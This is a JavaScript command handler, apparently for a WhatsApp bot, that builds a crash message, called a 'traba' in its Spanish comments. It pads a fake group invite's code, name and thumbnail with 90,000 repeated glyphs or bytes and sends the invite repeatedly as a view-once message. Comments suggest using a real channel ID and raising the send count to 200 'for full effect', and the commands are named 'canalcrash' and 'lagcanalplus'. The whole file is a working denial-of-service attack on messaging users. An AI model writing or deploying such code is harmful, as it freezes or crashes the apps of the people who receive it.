let handler = async (m, { conn }) => {
  const inviteCode = 'CHANNEL-XPL0IT-' + '𓂀'.repeat(90000);
  const groupName = '🔥 Canal Oficial ⚠️' + '꧁'.repeat(90000);
  const channelJid = '120363999999999999@g.us'; // Pon el JID de un canal real si quieres
  const thumbnailFake = Buffer.alloc(90000); // Traba pesada

  const fakeInviteContent = {
    groupJid: channelJid,
    inviteCode,
    groupName,
    jpegThumbnail: thumbnailFake
  };

  const wrappedMessage = {
    viewOnceMessage: {
      message: {
        groupInviteMessage: fakeInviteContent
      }
    }
  };

  // Envíalo múltiples veces
  for (let i = 0; i < 5; i++) { // Cambia a 200 para efecto completo
    await conn.relayMessage(
      m.chat,
      wrappedMessage,
      { messageId: generateMessageID() }
    );
  }

  m.reply('✅ *Traba de canal enviada como viewOnce correctamente.*');
};

handler.command = ["lagcanalplus", "canalcrash", "traba2"];
export default handler;

function generateMessageID() {
  return Math.random().toString(36).substring(2, 15);
}